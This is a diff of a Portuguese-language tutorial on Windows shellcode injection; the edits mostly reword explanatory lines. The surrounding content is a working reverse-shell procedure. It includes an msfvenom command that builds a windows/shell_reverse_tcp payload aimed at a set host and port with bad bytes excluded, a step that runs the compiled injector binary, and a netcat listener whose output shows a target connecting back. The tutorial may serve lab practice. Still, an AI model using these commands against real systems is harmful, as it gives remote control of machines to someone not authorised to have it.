@@ -27,7 +27,7 @@ msfconsole
 msfvenom -p windows/shell_reverse_tcp 
 LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
 ```
-- Ou Gerar os bytes do shellcode para Windows x64, apontando para o IP do computador que vai ganhar o acesso.
+- Ou Gerar os bytes do shellcode para Windows x64, apontando para o IP e Porta do computador que vai ganhar o acesso.
 
 
 ```ruby
@@ -93,12 +93,10 @@ injectlocal.exe
 nc -vlp 1234
 ```
 
-- Então assim que o binário compilado para injetar o
-shellcode for executado, devemos ganhar o acesso no
-alvo.
+- Então ao Executar o binário compilado no _Step 2_ para injeção de shellcode, já devemos ganhar o acesso ao computador que executou o shellcode.
 
 
-```bash
+```DOS
 nc -vlp 1234
 listening on [any] 1234 ...
 192.168.10.109: inverse host lookup failed: Host name lookup failure
